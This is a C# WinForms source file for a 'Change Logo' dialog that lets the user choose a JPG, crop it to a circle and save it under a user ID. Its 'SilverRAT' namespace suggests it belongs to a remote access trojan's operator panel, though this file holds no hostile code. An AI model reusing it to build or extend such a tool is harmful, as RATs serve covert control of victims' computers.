using Bunifu.Framework.UI;
using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using SilverRAT.Helper;
using SilverRAT.Properties;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Windows.Forms;

namespace SilverRAT.Forms;

public class ChangeLogo : Form
{
    public string FilenameImage;

    private IContainer components = null;

    private BunifuPictureBox ImageLogo;

    private BunifuLabel Nickname;

    private BunifuLabel UserID;

    private Guna2GradientButton Save;

    private Panel panel1;

    private PictureBox pictureBox2;

    private Label label1;

    private BunifuLabel bunifuLabel3;

    private Guna2GradientButton BrowserLogo;

    private Panel panelForm;

    private BunifuPanel PanelRight;

    private BunifuPanel PanelBottom;

    private BunifuPanel PanelLeft;

    private BunifuPanel PanelTOP;

    private BunifuElipse PanelElipse;

    private BunifuPanel PanelTitle;

    private BunifuLabel bunifuLabel2;

    private BunifuLabel bunifuLabel1;

    private PictureBox pictureBox1;

    private BunifuDragControl FormDragControl1;

    private Guna2CircleButton ButtClose;

    private Guna2CircleButton ButtionMinimized;

    private Guna2CircleButton ButtonMaximized;

    public Bitmap ImageLogo_ { get; set; }

    public string UserID_ { get; set; }

    public string Nickname_ { get; set; }

    public ChangeLogo()
    {
        InitializeComponent();
        MaximumSize = base.Size;
        MinimumSize = base.Size;
    }

    private void ChangeLogo_Load(object sender, EventArgs e)
    {
        try
        {
            ImageLogo.Image = ImageLogo_;
            UserID.Text = UserID_;
            Nickname.Text = Nickname_;
            PanelElipse.ElipseRadius = Settings.CurvatureForm;
            if (Settings.EnableEdgecurvatureForm)
            {
                PanelLeft.BackgroundColor = Settings.ColorCurvatureForm;
                PanelTOP.BackgroundColor = Settings.ColorCurvatureForm;
                PanelBottom.BackgroundColor = Settings.ColorCurvatureForm;
                PanelRight.BackgroundColor = Settings.ColorCurvatureForm;
            }
            else
            {
                PanelLeft.Visible = false;
                PanelTOP.Visible = false;
                PanelBottom.Visible = false;
                PanelRight.Visible = false;
            }
            if (ImageLogo != null)
            {
                pictureBox1.Image = ImageLogo_;
            }
        }
        catch
        {
        }
    }

    private void ChangeLogo_Shown(object sender, EventArgs e)
    {
        Program.Silver.TransitionShowng.ShowSync(panelForm);
    }

    private void Save_Click(object sender, EventArgs e)
    {
        try
        {
            if (!Directory.Exists(Settings.PathLogo))
            {
                Directory.CreateDirectory(Settings.PathLogo);
            }
            if (!string.IsNullOrEmpty(FilenameImage))
            {
                Bitmap bitmap = new Bitmap(Image.FromFile(FilenameImage));
                Image image = ClipToCircle(bitmap, new PointF(bitmap.Width / 2, bitmap.Height / 2), bitmap.Width / 2, Color.Transparent);
                ImageLogo.Image = image;
                ImageLogo.Image.Save(Settings.PathLogo + "\\" + UserID_ + ".logo");
                Notifiecation.Show("Change Logo!", "Logo has been change successfully", Resources.SuccessNotif, Color.FromArgb(103, 185, 108));
                Close();
            }
        }
        catch (Exception ex)
        {
            Notifiecation.Show("Change Logo!", ex.Message, Resources.ErrorNotif, Color.FromArgb(204, 102, 90));
            Program.Silver.TransitionHiddeng.HideSync(panelForm);
            Close();
        }
    }

    private void BrowserLogo_Click(object sender, EventArgs e)
    {
        try
        {
            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                Filter = "jpg |*.jpg"
            };
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                FilenameImage = openFileDialog.FileName;
                ImageLogo.Image = Image.FromFile(FilenameImage);
                Notifiecation.Show("Change Logo!", "Logo has been selcted successfully", Resources.SuccessNotif, Color.FromArgb(103, 185, 108));
                Save.Enabled = true;
            }
            else
            {
                Save.Enabled = false;
                FilenameImage = "";
            }
        }
        catch (Exception ex)
        {
            Notifiecation.Show("Change Logo!", ex.Message, Resources.ErrorNotif, Color.FromArgb(204, 102, 90));
        }
    }

    public Image ClipToCircle(Image srcImage, PointF center, float radius, Color backGround)
    {
        Image image = new Bitmap(srcImage.Width, srcImage.Height, srcImage.PixelFormat);
        using Graphics graphics = Graphics.FromImage(image);
        RectangleF rect = new RectangleF(center.X - radius, center.Y - radius, radius * 2f, radius * 2f);
        graphics.SmoothingMode = SmoothingMode.AntiAlias;
        using (Brush brush = new SolidBrush(backGround))
        {
            graphics.FillRectangle(brush, 0, 0, image.Width, image.Height);
        }
        GraphicsPath graphicsPath = new GraphicsPath();
        graphicsPath.AddEllipse(rect);
        graphics.SetClip(graphicsPath);
        graphics.DrawImage(srcImage, 0, 0);
        return image;
    }

    private void ButtClose_Click_1(object sender, EventArgs e)
    {
        Close();
    }

    private void ButtonMaximized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Maximized;
        }
        else if (base.WindowState == FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Normal;
        }
    }

    private void ButtionMinimized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Minimized)
        {
            base.WindowState = FormWindowState.Minimized;
        }
    }

    private void ChangeLogo_FormClosing(object sender, FormClosingEventArgs e)
    {
        Program.Silver.TransitionHiddeng.HideSync(panelForm);
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && components != null)
        {
            components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Forms.ChangeLogo));
        this.ImageLogo = new Bunifu.UI.WinForms.BunifuPictureBox();
        this.Nickname = new Bunifu.UI.WinForms.BunifuLabel();
        this.UserID = new Bunifu.UI.WinForms.BunifuLabel();
        this.BrowserLogo = new Guna.UI2.WinForms.Guna2GradientButton();
        this.panel1 = new System.Windows.Forms.Panel();
        this.pictureBox2 = new System.Windows.Forms.PictureBox();
        this.label1 = new System.Windows.Forms.Label();
        this.bunifuLabel3 = new Bunifu.UI.WinForms.BunifuLabel();
        this.Save = new Guna.UI2.WinForms.Guna2GradientButton();
        this.panelForm = new System.Windows.Forms.Panel();
        this.PanelTitle = new Bunifu.UI.WinForms.BunifuPanel();
        this.ButtClose = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtionMinimized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtonMaximized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.bunifuLabel2 = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel1 = new Bunifu.UI.WinForms.BunifuLabel();
        this.pictureBox1 = new System.Windows.Forms.PictureBox();
        this.PanelBottom = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelLeft = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelTOP = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelRight = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelElipse = new Bunifu.Framework.UI.BunifuElipse(this.components);
        this.FormDragControl1 = new Bunifu.Framework.UI.BunifuDragControl(this.components);
        ((System.ComponentModel.ISupportInitialize)this.ImageLogo).BeginInit();
        this.panel1.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox2).BeginInit();
        this.panelForm.SuspendLayout();
        this.PanelTitle.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
        base.SuspendLayout();
        this.ImageLogo.AllowFocused = false;
        this.ImageLogo.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.ImageLogo.AutoSizeHeight = true;
        this.ImageLogo.BackColor = System.Drawing.Color.White;
        this.ImageLogo.BorderRadius = 35;
        this.ImageLogo.Image = (System.Drawing.Image)resources.GetObject("ImageLogo.Image");
        this.ImageLogo.IsCircle = true;
        this.ImageLogo.Location = new System.Drawing.Point(293, 154);
        this.ImageLogo.Name = "ImageLogo";
        this.ImageLogo.Size = new System.Drawing.Size(70, 70);
        this.ImageLogo.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.ImageLogo.TabIndex = 0;
        this.ImageLogo.TabStop = false;
        this.ImageLogo.Type = Bunifu.UI.WinForms.BunifuPictureBox.Types.Circle;
        this.Nickname.AllowParentOverrides = false;
        this.Nickname.AutoEllipsis = false;
        this.Nickname.AutoSize = false;
        this.Nickname.Cursor = System.Windows.Forms.Cursors.Default;
        this.Nickname.CursorType = System.Windows.Forms.Cursors.Default;
        this.Nickname.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.Nickname.Location = new System.Drawing.Point(137, 230);
        this.Nickname.Name = "Nickname";
        this.Nickname.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.Nickname.Size = new System.Drawing.Size(390, 17);
        this.Nickname.TabIndex = 1;
        this.Nickname.Text = "Nickname";
        this.Nickname.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
        this.Nickname.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.UserID.AllowParentOverrides = false;
        this.UserID.AutoEllipsis = false;
        this.UserID.AutoSize = false;
        this.UserID.Cursor = System.Windows.Forms.Cursors.Default;
        this.UserID.CursorType = System.Windows.Forms.Cursors.Default;
        this.UserID.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.UserID.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
        this.UserID.Location = new System.Drawing.Point(137, 254);
        this.UserID.Name = "UserID";
        this.UserID.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.UserID.Size = new System.Drawing.Size(390, 15);
        this.UserID.TabIndex = 2;
        this.UserID.Text = "UserID";
        this.UserID.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
        this.UserID.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.BrowserLogo.Animated = true;
        this.BrowserLogo.BackColor = System.Drawing.Color.White;
        this.BrowserLogo.BorderRadius = 15;
        this.BrowserLogo.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.BrowserLogo.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.BrowserLogo.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.BrowserLogo.CheckedState.Parent = this.BrowserLogo;
        this.BrowserLogo.Cursor = System.Windows.Forms.Cursors.Hand;
        this.BrowserLogo.CustomImages.Parent = this.BrowserLogo;
        this.BrowserLogo.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.BrowserLogo.FillColor2 = System.Drawing.Color.FromArgb(244, 244, 250);
        this.BrowserLogo.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.BrowserLogo.ForeColor = System.Drawing.Color.White;
        this.BrowserLogo.HoverState.Parent = this.BrowserLogo;
        this.BrowserLogo.Image = (System.Drawing.Image)resources.GetObject("BrowserLogo.Image");
        this.BrowserLogo.ImageSize = new System.Drawing.Size(24, 24);
        this.BrowserLogo.Location = new System.Drawing.Point(359, 139);
        this.BrowserLogo.Name = "BrowserLogo";
        this.BrowserLogo.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.BrowserLogo.PressedDepth = 50;
        this.BrowserLogo.ShadowDecoration.Parent = this.BrowserLogo;
        this.BrowserLogo.Size = new System.Drawing.Size(30, 30);
        this.BrowserLogo.TabIndex = 576;
        this.BrowserLogo.Click += new System.EventHandler(BrowserLogo_Click);
        this.panel1.BackColor = System.Drawing.Color.FromArgb(250, 219, 95);
        this.panel1.Controls.Add(this.pictureBox2);
        this.panel1.Controls.Add(this.label1);
        this.panel1.Controls.Add(this.bunifuLabel3);
        this.panel1.Location = new System.Drawing.Point(32, 287);
        this.panel1.Name = "panel1";
        this.panel1.Size = new System.Drawing.Size(602, 44);
        this.panel1.TabIndex = 575;
        this.pictureBox2.Image = Properties.Resources.Bitmap_1;
        this.pictureBox2.Location = new System.Drawing.Point(3, 2);
        this.pictureBox2.Name = "pictureBox2";
        this.pictureBox2.Size = new System.Drawing.Size(29, 39);
        this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.pictureBox2.TabIndex = 576;
        this.pictureBox2.TabStop = false;
        this.label1.AutoSize = true;
        this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.label1.Location = new System.Drawing.Point(581, 3);
        this.label1.Name = "label1";
        this.label1.Size = new System.Drawing.Size(16, 15);
        this.label1.TabIndex = 578;
        this.label1.Text = "X";
        this.bunifuLabel3.AllowParentOverrides = false;
        this.bunifuLabel3.AutoEllipsis = false;
        this.bunifuLabel3.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel3.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel3.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.bunifuLabel3.ForeColor = System.Drawing.Color.FromArgb(26, 26, 26);
        this.bunifuLabel3.Location = new System.Drawing.Point(36, 16);
        this.bunifuLabel3.Name = "bunifuLabel3";
        this.bunifuLabel3.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel3.Size = new System.Drawing.Size(541, 15);
        this.bunifuLabel3.TabIndex = 577;
        this.bunifuLabel3.Text = "It is recommended that you select a picture in pixel size 67 x 67 in order to give you an excellent quality";
        this.bunifuLabel3.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel3.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.Save.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.Save.Animated = true;
        this.Save.BackColor = System.Drawing.Color.White;
        this.Save.BorderRadius = 8;
        this.Save.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Save.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Save.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Save.CheckedState.Parent = this.Save;
        this.Save.Cursor = System.Windows.Forms.Cursors.Hand;
        this.Save.CustomImages.Parent = this.Save;
        this.Save.Enabled = false;
        this.Save.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Save.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Save.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.Save.ForeColor = System.Drawing.Color.White;
        this.Save.HoverState.Parent = this.Save;
        this.Save.Location = new System.Drawing.Point(533, 391);
        this.Save.Name = "Save";
        this.Save.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.Save.PressedDepth = 50;
        this.Save.ShadowDecoration.Parent = this.Save;
        this.Save.Size = new System.Drawing.Size(103, 30);
        this.Save.TabIndex = 574;
        this.Save.Text = "Save";
        this.Save.Click += new System.EventHandler(Save_Click);
        this.panelForm.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.panelForm.BackColor = System.Drawing.Color.White;
        this.panelForm.Controls.Add(this.PanelTitle);
        this.panelForm.Controls.Add(this.PanelBottom);
        this.panelForm.Controls.Add(this.PanelLeft);
        this.panelForm.Controls.Add(this.PanelTOP);
        this.panelForm.Controls.Add(this.PanelRight);
        this.panelForm.Controls.Add(this.Save);
        this.panelForm.Controls.Add(this.BrowserLogo);
        this.panelForm.Controls.Add(this.panel1);
        this.panelForm.Controls.Add(this.ImageLogo);
        this.panelForm.Controls.Add(this.UserID);
        this.panelForm.Controls.Add(this.Nickname);
        this.panelForm.Location = new System.Drawing.Point(12, 12);
        this.panelForm.Name = "panelForm";
        this.panelForm.Size = new System.Drawing.Size(666, 438);
        this.panelForm.TabIndex = 570;
        this.panelForm.Visible = false;
        this.PanelTitle.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTitle.BackgroundColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTitle.BackgroundImage");
        this.PanelTitle.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTitle.BorderColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BorderRadius = 22;
        this.PanelTitle.BorderThickness = 1;
        this.PanelTitle.Controls.Add(this.ButtClose);
        this.PanelTitle.Controls.Add(this.ButtionMinimized);
        this.PanelTitle.Controls.Add(this.ButtonMaximized);
        this.PanelTitle.Controls.Add(this.bunifuLabel2);
        this.PanelTitle.Controls.Add(this.bunifuLabel1);
        this.PanelTitle.Controls.Add(this.pictureBox1);
        this.PanelTitle.Cursor = System.Windows.Forms.Cursors.SizeAll;
        this.PanelTitle.Location = new System.Drawing.Point(16, 22);
        this.PanelTitle.Name = "PanelTitle";
        this.PanelTitle.ShowBorders = true;
        this.PanelTitle.Size = new System.Drawing.Size(636, 77);
        this.PanelTitle.TabIndex = 596;
        this.ButtClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtClose.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtClose.CheckedState.Parent = this.ButtClose;
        this.ButtClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtClose.CustomImages.Parent = this.ButtClose;
        this.ButtClose.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtClose.ForeColor = System.Drawing.Color.White;
        this.ButtClose.HoverState.BorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.Parent = this.ButtClose;
        this.ButtClose.Location = new System.Drawing.Point(606, 13);
        this.ButtClose.Name = "ButtClose";
        this.ButtClose.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtClose.ShadowDecoration.Parent = this.ButtClose;
        this.ButtClose.Size = new System.Drawing.Size(17, 17);
        this.ButtClose.TabIndex = 573;
        this.ButtClose.Click += new System.EventHandler(ButtClose_Click_1);
        this.ButtionMinimized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtionMinimized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtionMinimized.CheckedState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtionMinimized.CustomImages.Parent = this.ButtionMinimized;
        this.ButtionMinimized.FillColor = System.Drawing.Color.FromArgb(97, 196, 83);
        this.ButtionMinimized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtionMinimized.ForeColor = System.Drawing.Color.White;
        this.ButtionMinimized.HoverState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Location = new System.Drawing.Point(558, 13);
        this.ButtionMinimized.Name = "ButtionMinimized";
        this.ButtionMinimized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtionMinimized.ShadowDecoration.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Size = new System.Drawing.Size(17, 17);
        this.ButtionMinimized.TabIndex = 575;
        this.ButtionMinimized.Click += new System.EventHandler(ButtionMinimized_Click);
        this.ButtonMaximized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtonMaximized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtonMaximized.CheckedState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtonMaximized.CustomImages.Parent = this.ButtonMaximized;
        this.ButtonMaximized.FillColor = System.Drawing.Color.FromArgb(244, 190, 83);
        this.ButtonMaximized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtonMaximized.ForeColor = System.Drawing.Color.White;
        this.ButtonMaximized.HoverState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Location = new System.Drawing.Point(582, 13);
        this.ButtonMaximized.Name = "ButtonMaximized";
        this.ButtonMaximized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtonMaximized.ShadowDecoration.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Size = new System.Drawing.Size(17, 17);
        this.ButtonMaximized.TabIndex = 574;
        this.ButtonMaximized.Click += new System.EventHandler(ButtonMaximized_Click);
        this.bunifuLabel2.AllowParentOverrides = false;
        this.bunifuLabel2.AutoEllipsis = false;
        this.bunifuLabel2.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel2.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel2.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.bunifuLabel2.ForeColor = System.Drawing.Color.DarkGray;
        this.bunifuLabel2.Location = new System.Drawing.Point(75, 40);
        this.bunifuLabel2.Name = "bunifuLabel2";
        this.bunifuLabel2.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel2.Size = new System.Drawing.Size(10, 15);
        this.bunifuLabel2.TabIndex = 572;
        this.bunifuLabel2.Text = "--";
        this.bunifuLabel2.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel2.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.bunifuLabel1.AllowParentOverrides = false;
        this.bunifuLabel1.AutoEllipsis = false;
        this.bunifuLabel1.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.bunifuLabel1.ForeColor = System.Drawing.Color.Black;
        this.bunifuLabel1.Location = new System.Drawing.Point(75, 17);
        this.bunifuLabel1.Name = "bunifuLabel1";
        this.bunifuLabel1.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel1.Size = new System.Drawing.Size(80, 17);
        this.bunifuLabel1.TabIndex = 571;
        this.bunifuLabel1.Text = "Change Logo";
        this.bunifuLabel1.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel1.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.pictureBox1.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
        this.pictureBox1.Location = new System.Drawing.Point(10, 13);
        this.pictureBox1.Name = "pictureBox1";
        this.pictureBox1.Size = new System.Drawing.Size(59, 50);
        this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.pictureBox1.TabIndex = 570;
        this.pictureBox1.TabStop = false;
        this.PanelBottom.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelBottom.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelBottom.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelBottom.BackgroundImage");
        this.PanelBottom.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelBottom.BorderColor = System.Drawing.Color.White;
        this.PanelBottom.BorderRadius = 30;
        this.PanelBottom.BorderThickness = 1;
        this.PanelBottom.Location = new System.Drawing.Point(170, 427);
        this.PanelBottom.Name = "PanelBottom";
        this.PanelBottom.ShowBorders = true;
        this.PanelBottom.Size = new System.Drawing.Size(333, 25);
        this.PanelBottom.TabIndex = 594;
        this.PanelLeft.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.PanelLeft.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelLeft.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelLeft.BackgroundImage");
        this.PanelLeft.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelLeft.BorderColor = System.Drawing.Color.White;
        this.PanelLeft.BorderRadius = 30;
        this.PanelLeft.BorderThickness = 1;
        this.PanelLeft.Location = new System.Drawing.Point(-16, 112);
        this.PanelLeft.Name = "PanelLeft";
        this.PanelLeft.ShowBorders = true;
        this.PanelLeft.Size = new System.Drawing.Size(25, 219);
        this.PanelLeft.TabIndex = 593;
        this.PanelTOP.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTOP.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelTOP.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTOP.BackgroundImage");
        this.PanelTOP.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTOP.BorderColor = System.Drawing.Color.White;
        this.PanelTOP.BorderRadius = 30;
        this.PanelTOP.BorderThickness = 1;
        this.PanelTOP.Location = new System.Drawing.Point(170, -14);
        this.PanelTOP.Name = "PanelTOP";
        this.PanelTOP.ShowBorders = true;
        this.PanelTOP.Size = new System.Drawing.Size(333, 25);
        this.PanelTOP.TabIndex = 592;
        this.PanelRight.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.PanelRight.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelRight.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelRight.BackgroundImage");
        this.PanelRight.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelRight.BorderColor = System.Drawing.Color.White;
        this.PanelRight.BorderRadius = 30;
        this.PanelRight.BorderThickness = 1;
        this.PanelRight.Location = new System.Drawing.Point(656, 108);
        this.PanelRight.Name = "PanelRight";
        this.PanelRight.ShowBorders = true;
        this.PanelRight.Size = new System.Drawing.Size(25, 219);
        this.PanelRight.TabIndex = 591;
        this.PanelElipse.ElipseRadius = 4;
        this.PanelElipse.TargetControl = this.panelForm;
        this.FormDragControl1.Fixed = true;
        this.FormDragControl1.Horizontal = true;
        this.FormDragControl1.TargetControl = this.PanelTitle;
        this.FormDragControl1.Vertical = true;
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.Gainsboro;
        base.ClientSize = new System.Drawing.Size(690, 462);
        base.Controls.Add(this.panelForm);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Name = "ChangeLogo";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "e";
        base.TopMost = true;
        base.TransparencyKey = System.Drawing.Color.Gainsboro;
        base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(ChangeLogo_FormClosing);
        base.Load += new System.EventHandler(ChangeLogo_Load);
        base.Shown += new System.EventHandler(ChangeLogo_Shown);
        ((System.ComponentModel.ISupportInitialize)this.ImageLogo).EndInit();
        this.panel1.ResumeLayout(false);
        this.panel1.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox2).EndInit();
        this.panelForm.ResumeLayout(false);
        this.PanelTitle.ResumeLayout(false);
        this.PanelTitle.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
        base.ResumeLayout(false);
    }
}
